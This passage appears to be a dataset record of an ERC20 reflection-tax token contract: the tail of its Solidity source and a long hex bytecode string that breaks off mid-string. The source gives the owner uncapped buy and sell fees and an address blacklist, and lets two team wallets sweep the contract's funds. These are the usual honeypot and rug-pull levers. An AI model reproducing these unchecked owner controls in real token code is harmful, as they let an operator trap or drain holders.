tradingOpen = _tradingOpen; } function manualswap() external { require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress); uint256 contractBalance = balanceOf(address(this)); swapTokensForEth(contractBalance); } function manualsend() external { require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress); uint256 contractETHBalance = address(this).balance; sendETHToFee(contractETHBalance); } function blockBots(address[] memory bots_) public onlyOwner { for (uint256 i = 0; i < bots_.length; i++) { bots[bots_[i]] = true; } } function unblockBot(address notbot) public onlyOwner { bots[notbot] = false; } function _tokenTransfer( address sender, address recipient, uint256 amount, bool takeFee ) private { if (!takeFee) removeAllFee(); _transferStandard(sender, recipient, amount); if (!takeFee) restoreAllFee(); } function _transferStandard( address sender, address recipient, uint256 tAmount ) private { ( uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam ) = _getValues(tAmount); _rOwned[sender] = _rOwned[sender].sub(rAmount); _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); _takeTeam(tTeam); _reflectFee(rFee, tFee); emit Transfer(sender, recipient, tTransferAmount); } function _takeTeam(uint256 tTeam) private { uint256 currentRate = _getRate(); uint256 rTeam = tTeam.mul(currentRate); _rOwned[address(this)] = _rOwned[address(this)].add(rTeam); } function _reflectFee(uint256 rFee, uint256 tFee) private { _rTotal = _rTotal.sub(rFee); _tFeeTotal = _tFeeTotal.add(tFee); } receive() external payable {} function _getValues(uint256 tAmount) private view returns ( uint256, uint256, uint256, uint256, uint256, uint256 ) { (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _taxFee); uint256 currentRate = _getRate(); (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate); return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam); } function _getTValues( uint256 tAmount, uint256 redisFee, uint256 taxFee ) private pure returns ( uint256, uint256, uint256 ) { uint256 tFee = tAmount.mul(redisFee).div(100); uint256 tTeam = tAmount.mul(taxFee).div(100); uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam); return (tTransferAmount, tFee, tTeam); } function _getRValues( uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate ) private pure returns ( uint256, uint256, uint256 ) { uint256 rAmount = tAmount.mul(currentRate); uint256 rFee = tFee.mul(currentRate); uint256 rTeam = tTeam.mul(currentRate); uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam); return (rAmount, rTransferAmount, rFee); } function _getRate() private view returns (uint256) { (uint256 rSupply, uint256 tSupply) = _getCurrentSupply(); return rSupply.div(tSupply); } function _getCurrentSupply() private view returns (uint256, uint256) { uint256 rSupply = _rTotal; uint256 tSupply = _tTotal; if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); return (rSupply, tSupply); } function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner { _redisFeeOnBuy = redisFeeOnBuy; _redisFeeOnSell = redisFeeOnSell; _taxFeeOnBuy = taxFeeOnBuy; _taxFeeOnSell = taxFeeOnSell; } function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner { _swapTokensAtAmount = _tTotal * swapTokensAtAmount / 1000; } function toggleSwap(bool _swapEnabled) public onlyOwner { swapEnabled = _swapEnabled; } function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner { _maxTxAmount = _tTotal * maxTxAmount / 1000; } function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner { _maxWalletSize = _tTotal * maxWalletSize / 1000; } function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner { for(uint256 i = 0; i < accounts.length; i++) { _isExcludedFromFee[accounts[i]] = excluded; } }}",0x6080604052600436106101d05760003560e01c80637d1db4a5116100f7578063a2a957bb11610095578063c492f04611610064578063c492f0461461065c578063dd62ed3e14610685578063ea1644d5146106c2578063f2fde38b146106eb576101d7565b8063a2a957bb146105a2578063a9059cbb146105cb578063bfd7928414610608578063c3c8cd8014610645576101d7565b80638f70ccf7116100d15780638f70ccf7146104fa5780638f9a55c01461052357806395d89b411461054e57806398a5c31514610579576101d7565b80637d1db4a5146104675780637f2feddc146104925780638da5cb5b146104cf576101d7565b8063313ce5671161016f5780636fc3eaec1161013e5780636fc3eaec146103d357806370a08231146103ea578063715018a61461042757806374010ece1461043e576101d7565b8063313ce5671461032b57806349bd5a5e146103565780636b999053146103815780636d8aa8f8146103aa576101d7565b80631694505e116101ab5780631694505e1461026d57806318160ddd1461029857806323b872dd146102c35780632fd689e314610300576101d7565b8062b8cf2a146101dc57806306fdde0314610205578063095ea7b314610230576101d7565b366101d757005b600080fd5b3480156101e857600080fd5b5061020360048036038101906101fe9190612dcc565b610714565b005b34801561021157600080fd5b5061021a61083e565b6040516102279190612e9d565b60405180910390f35b34801561023c57600080fd5b5061025760048036038101906102529190612ef5565b61087b565b6040516102649190612f50565b60405180910390f35b34801561027957600080fd5b50610282610899565b60405161028f9190612fca565b60405180910390f35b3480156102a457600080fd5b506102ad6108bf565b6040516102ba9190612ff4565b60405180910390f35b3480156102cf57600080fd5b506102ea60048036038101906102e5919061300f565b6108cf565b6040516102f79190612f50565b60405180910390f35b34801561030c57600080fd5b506103156109a8565b6040516103229190612ff4565b60405180910390f35b34801561033757600080fd5b506103406109ae565b60405161034d919061307e565b60405180910390f35b34801561036257600080fd5b5061036b6109b7565b60405161037891906130a8565b60405180910390f35b34801561038d57600080fd5b506103a860048036038101906103a391906130c3565b6109dd565b005b3480156103b657600080fd5b506103d160048036038101906103cc919061311c565b610acd565b005b3480156103df57600080fd5b506103e8610b7f565b005b3480156103f657600080fd5b50610411600480360381019061040c91906130c3565b610c50565b60405161041e9190612ff4565b60405180910390f35b34801561043357600080fd5b5061043c610ca1565b005b34801561044a57600080fd5b5061046560048036038101906104609190613149565b610df4565b005b34801561047357600080fd5b5061047c610eb3565b6040516104899190612ff4565b60405180910390f35b34801561049e57600080fd5b506104b960048036038101906104b491906130c3565b610eb9565b6040516104c69190612ff4565b60405180910390f35b3480156104db57600080fd5b506104e4610ed1565b6040516104f191906130a8565b60405180910390f35b34801561050657600080fd5b50610521600480360381019061051c919061311c565b610efa565b005b34801561052f57600080fd5b50610538610fac565b6040516105459190612ff4565b60405180910390f35b34801561055a57600080fd5b50610563610fb2565b6040516105709190612e9d565b60405180910390f35b34801561058557600080fd5b506105a0600480360381019061059b9190613149565b610fef565b005b3480156105ae57600080fd5b506105c960048036038101906105c49190613176565b6110ae565b005b3480156105d757600080fd5b506105f260048036038101906105ed9190612ef5565b611165565b6040516105ff9190612f50565b60405180910390f35b34801561061457600080fd5b5061062f600480360381019061062a91906130c3565b611183565b60405161063c9190612f50565b60405180910390f35b34801561065157600080fd5b5061065a6111a3565b005b34801561066857600080fd5b50610683600480360381019061067e9190613238565b61127c565b005b34801561069157600080fd5b506106ac60048036038101906106a79190613298565b6113b6565b6040516106b99190612ff4565b60405180910390f35b3480156106ce57600080fd5b506106e960048036038101906106e49190613149565b61143d565b005b3480156106f757600080fd5b50610712600480360381019061070d91906130c3565b6114fc565b005b61071c6116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146107a9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107a090613324565b60405180910390fd5b60005b815181101561083a576001601060008484815181106107ce576107cd613344565b5b602002602001015173ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508080610832906133a2565b9150506107ac565b5050565b60606040518060400160405280600681526020017f3353484942410000000000000000000000000000000000000000000000000000815250905090565b600061088f6108886116be565b84846116c6565b6001905092915050565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000670de0b6b3a7640000905090565b60006108dc848484611891565b61099d846108e86116be565b61099885604051806060016040528060288152602001613de360289139600460008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061094e6116be565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546121169092919063ffffffff16565b6116c6565b600190509392505050565b60185481565b60006009905090565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6109e56116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610a72576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a6990613324565b60405180910390fd5b6000601060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b610ad56116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610b62576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b5990613324565b60405180910390fd5b80601560166101000a81548160ff02191690831515021790555050565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16610bc06116be565b73ffffffffffffffffffffffffffffffffffffffff161480610c365750601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16610c1e6116be565b73ffffffffffffffffffffffffffffffffffffffff16145b610c3f57600080fd5b6000479050610c4d8161217a565b50565b6000610c9a600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546121e6565b9050919050565b610ca96116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610d36576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d2d90613324565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b610dfc6116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610e89576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e8090613324565b60405180910390fd5b6103e881670de0b6b3a7640000610ea091906133eb565b610eaa9190613474565b60168190555050565b60165481565b60116020528060005260406000206000915090505481565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b610f026116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610f8f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f8690613324565b60405180910390fd5b80601560146101000a81548160ff02191690831515021790555050565b60175481565b60606040518060400160405280600581526020017f3353484942000000000000000000000000000000000000000000000000000000815250905090565b610ff76116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611084576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161107b90613324565b60405180910390fd5b6103e881670de0b6b3a764000061109b91906133eb565b6110a59190613474565b60188190555050565b6110b66116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611143576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161113a90613324565b60405180910390fd5b8360088190555082600a819055508160098190555080600b8190555050505050565b60006111796111726116be565b8484611891565b6001905092915050565b60106020528060005260406000206000915054906101000a900460ff1681565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166111e46116be565b73ffffffffffffffffffffffffffffffffffffffff16148061125a5750601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166112426116be565b73ffffffffffffffffffffffffffffffffffffffff16145b61126357600080fd5b600061126e30610c50565b905061127981612254565b50565b6112846116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611311576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161130890613324565b60405180910390fd5b60005b838390508110156113b057816005600086868581811061133757611336613344565b5b905060200201602081019061134c91906130c3565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555080806113a8906133a2565b915050611314565b50505050565b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6114456116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146114d2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114c990613324565b60405180910390fd5b6103e881670de0b6b3a76400006114e991906133eb565b6114f39190613474565b60178190555050565b6115046116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611591576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161158890613324565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415611601576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115f890613517565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611736576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161172d906135a9565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156117a6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161179d9061363b565b60405180910390fd5b80600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516118849190612ff4565b60405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611901576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016118f8906136cd565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611971576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119689061375f565b60405180910390fd5b600081116119b4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119ab906137f1565b60405180910390fd5b6119bc610ed1565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614158015611a2a57506119fa610ed1565b73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b15611e1557601560149054906101000a900460ff16611ab957611a4b610ed1565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614611ab8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611aaf90613883565b60405180910390fd5b5b601654811115611afe576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611af5906138ef565b60405180910390fd5b601060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16158015611ba25750601060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b611be1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611bd890613981565b60405180910390fd5b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614611c8e5760175481611c4384610c50565b611c4d91906139a1565b10611c8d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611c8490613a69565b60405180910390fd5b5b6000611c9930610c50565b9050600060185482101590506016548210611cb45760165491505b808015611ccc575060158054906101000a900460ff16155b8015611d265750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614155b8015611d3e5750601560169054906101000a900460ff165b8015611d945750600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b8015611dea5750600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b15611e1257611df882612254565b60004790506000811115611e1057611e0f4761217a565b5b505b50505b600060019050600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1680611ebc5750600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b80611f6f5750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614158015611f6e5750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b5b15611f7d5760009050612104565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480156120285750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b1561204057600854600c81905550600954600d819055505b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161480156120eb5750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614155b1561210357600a54600c81905550600b54600d819055505b5b612110848484846124da565b50505050565b600083831115829061215e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016121559190612e9d565b60405180910390fd5b506000838561216d9190613a89565b9050809150509392505050565b601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501580156121e2573d6000803e3d6000fd5b5050565b600060065482111561222d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161222490613b2f565b60405180910390fd5b6000612237612507565b905061224c818461253290919063ffffffff16565b915050919050565b60016015806101000a81548160ff0219169083151502179055506000600267ffffffffffffffff81111561228b5761228a612c2b565b5b6040519080825280602002602001820160405280156122b95781602001602082028036833780820191505090505b50905030816000815181106122d1576122d0613344565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b815260040160206040518083038186803b15801561237357600080fd5b505afa158015612387573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906123ab9190613b64565b816001815181106123bf576123be613344565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505061242630601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16846116c6565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663791ac9478360008430426040518663ffffffff1660e01b815260040161248a959493929190613c8a565b600060405180830381600087803b1580156124a457600080fd5b505af11580156124b8573d6000803e3d6000fd5b505050505060006015806101000a81548160ff02191690831515021790555050565b806124e8576124e761257c565b5b6124f38484846125bf565b806125015761250061278a565b5b50505050565b600080600061251461279e565b9150915061252b818361253290919063ffffffff16565b9250505090565b600061257483836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506127fd565b905092915050565b6000600c5414801561259057506000600d54145b1561259a576125bd565b600c54600e81905550600d54600f819055506000600c819055506000600d819055505b565b6000806000806000806125d187612860565b95509550955095509550955061262f86600260008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546128c890919063ffffffff16565b600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506126c485600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461291290919063ffffffff16565b600260008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061271081612970565b61271a8483612a2d565b8773ffffffffffffffffffffffffffffffffffffffff168973ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef856040516127779190612ff4565b60405180910390a3505050505050505050565b600e54600c81905550600f54600d81905550565b600080600060065490506000670de0b6b3a764000090506127d2670de0b6b3a764000060065461253290919063ffffffff16565b8210156127f057600654670de0b6b3a76400009350935050506127f9565b81819350935050505b9091565b60008083118290612844576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161283b9190612e9d565b60405180910390fd5b50600083856128539190613474565b9050809150509392505050565b600080600080600080600080600061287d8a600c54600d54612a67565b925092509250600061288d612507565b905060008060006128a08e878787612afd565b9250925092508282828989899c509c509c509c509c509c505050505050505091939550919395565b600061290a83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250612116565b905092915050565b600080828461292191906139a1565b905083811015612966576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161295d90613d30565b60405180910390fd5b8091505092915050565b600061297a612507565b905060006129918284612b8690919063ffffffff16565b90506129e581600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461291290919063ffffffff16565b600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b612a42826006546128c890919063ffffffff16565b600681905550612a5d8160075461291290919063ffffffff16565b6007819055505050565b600080600080612a936064612a85888a612b8690919063ffffffff16565b61253290919063ffffffff16565b90506000612abd6064612aaf888b612b8690919063ffffffff16565b61253290919063ffffffff16565b90506000612ae682612ad8858c6128c890919063ffffffff16565b6128c890919063ffffffff16565b905080838395509550955050505093509350939050565b600080600080612b168589612b8690919063ffffffff16565b90506000612b2d8689612b8690919063ffffffff16565b90506000612b448789612b8690919063ffffffff16565b90506000612b6d82612b5f85876128c890919063ffffffff16565b6128c890919063ffffffff16565b9050838184965096509650505050509450945094915050565b600080831415612b995760009050612bfb565b60008284612ba791906133eb565b9050828482612bb69190613474565b14612bf6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401612bed90613dc2565b60405180910390fd5b809150505b92915050565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b612c6382612c1a565b810181811067ffffffffffffffff82111715612c8257612c81612c2b565b5b80604052505050565b6000612c95612c01565b9050612ca18282612c5a565b919050565b600067ffffffffffffffff821115612cc157612cc0612c2b565b5b602082029050602081019050919050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000612d0282612cd7565b9050919050565b612d1281612cf7565b8114612d1d57600080fd5b50565b600081359050612d2f81612d09565b92915050565b6000612d48612d4384612ca6565b612c8b565b90508083825260208201905060208402830185811115612d6b57612d6a612cd2565b5b835b81811015612d945780612d808882612d20565b845260208401935050602081019050612d6d565b5050509392505050565b600082601f830112612db357612db2612c15565b5b8135612dc3848260208601612d35565b91505092915050565b600060208284031215612de257612de1612c0b565b5b600082013567ffffffffffffffff811115612e0057612dff612c10565b5b612e0c84828501612d9e565b91505092915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015612e4f578082015181840152602081019050612e34565b83811115612e5e576000848401525b50505050565b6000612e6f82612e15565b612e798185612e20565b9350612e89818560208601612e31565b612e9281612c1a565b840191505092915050565b60006020820190508181036000830152612eb78184612e64565b905092915050565b6000819050919050565b612ed281612ebf565b8114612edd57600080fd5b50565b600081359050612eef81612ec9565b92915050565b60008060408385031215612f0c57612f0b612c0b565b5b6000612f1a85828601612d20565b9250506020612f2b85828601612ee0565b9150509250929050565b60008115159050919050565b612f4a81612f35565b82525050565b6000602082019050612f656000830184612f41565b92915050565b6000819050919050565b6000612f90612f8b612f8684612cd7565b612f6b565b612cd7565b9050919050565b6000612fa282612f75565b9050919050565b6000612fb482612f97565b9050919050565b612fc481612fa9565b82525050565b6000602082019050612fdf6000830184612fbb565b92915050565b612fee81612ebf565b82525050565b60006020820190506130096000830184612fe5565b92915050565b60008060006060848603121561302857613027612c0b565b5b600061303686828701612d20565b935050602061304786828701612d20565b925050604061305886828701612ee0565b9150509250925092565b600060ff82169050919050565b61307881613062565b82525050565b6000602082019050613093600083018461306f565b92915050565b6130a281612cf7565b82525050565b60006020820190506130bd6000830184613099565b92915050565b6000602082840312156130d9576130d8612c0b565b5b60006130e784828501612d20565b91505092915050565b6130f981612f35565b811461310457600080fd5b50565b600081359050613116816130f0565b92915050565b60006020828403121561313257613131612c0b565b5b600061314084828501613107565b91505092915050565b60006020828403121561315f5761315e612c0b565b5b600061316d84828501612ee0565b91505092915050565b600080600080608085870312156131905761318f612c0b565b5b600061319e87828801612ee0565b94505060206131af87828801612ee0565b93505060406131c087828801612ee0565b92505060606131d187828801612ee0565b91505092959194509250565b600080fd5b60008083601f8401126131f8576131f7612c15565b5b8235905067ffffffffffffffff811115613215576132146131dd565b5b60208301915083602082028301111561323157613230612cd2565b5b9250929050565b60008060006040848603121561325157613250612c0b565b5b600084013567ffffffffffffffff81111561326f5761326e612c10565b5b61327b868287016131e2565b9350935050602061328e86828701613107565b9150509250925092565b600080604083850312156132af576132ae612c0b565b5b60006132bd85828601612d20565b92505060206132ce85828601612d20565b9150509250929050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b600061330e602083612e20565b9150613319826132d8565b602082019050919050565b6000602082019050818103600083015261333d81613301565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006133ad82612ebf565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156133e0576133df613373565b5b600182019050919050565b60006133f682612ebf565b915061340183612ebf565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff048311821515161561343a57613439613373565b5b828202905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061347f82612ebf565b915061348a83612ebf565b92508261349a57613499613445565b5b828204905092915050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b6000613501602683612e20565b915061350c826134a5565b604082019050919050565b60006020820190508181036000830152613530816134f4565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000613593602483612e20565b915061359e82613537565b604082019050919050565b600060208201905081810360008301526135c281613586565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b6000613625602283612e20565b9150613630826135c9565b604082019050919050565b6000602082019050818103600083015261365481613618565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b60006136b7602583612e20565b91506136c28261365b565b604082019050919050565b600060208201905081810360008301526136e6816136aa565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b6000613749602383612e20565b9150613754826136ed565b604082019050919050565b600060208201905081810360008301526137788161373c565b9050919050565b7f5472616e7366657220616d6f756e74206d75737420626520677265617465722060008201527f7468616e207a65726f0000000000000000000000000000000000000000000000602082015250565b60006137db602983612e20565b91506137e68261377f565b604082019050919050565b6000602082019050818103600083015261380a816137ce565b9050919050565b7f544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e642060008201527f746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400602082015250565b600061386d603f83612e20565b915061387882613811565b604082019050919050565b6000602082019050818